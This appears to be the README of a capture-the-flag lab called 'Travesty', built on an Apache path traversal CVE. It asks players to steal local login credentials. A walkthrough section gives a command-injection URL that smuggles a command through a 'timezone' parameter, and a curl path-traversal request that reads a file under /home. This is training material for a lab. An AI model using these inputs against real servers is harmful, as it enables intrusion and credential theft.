# Travesty
Find the vulnerabilities on the website that can be breached in a few different ways. Can you get the local users' login creds?

Thanks https://github.com/twseptian/cve-2021-42013-docker-lab/ for the idea and some code.

<details>
<summary>Hint</summary>
Look for a CVE for this technology. Where can you see details about the technology in use?
</details>

<details>
<summary>Walkthrough</summary>

1. For RCE, hit 
```
http://localhost/cgi-bin/get_time.pl?timezone=b;COMMAND
```
2. Or Path Traversal for file disclosure:
```
curl -s --path-as-is "http://localhost/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/home/backups.sh"
```
</details>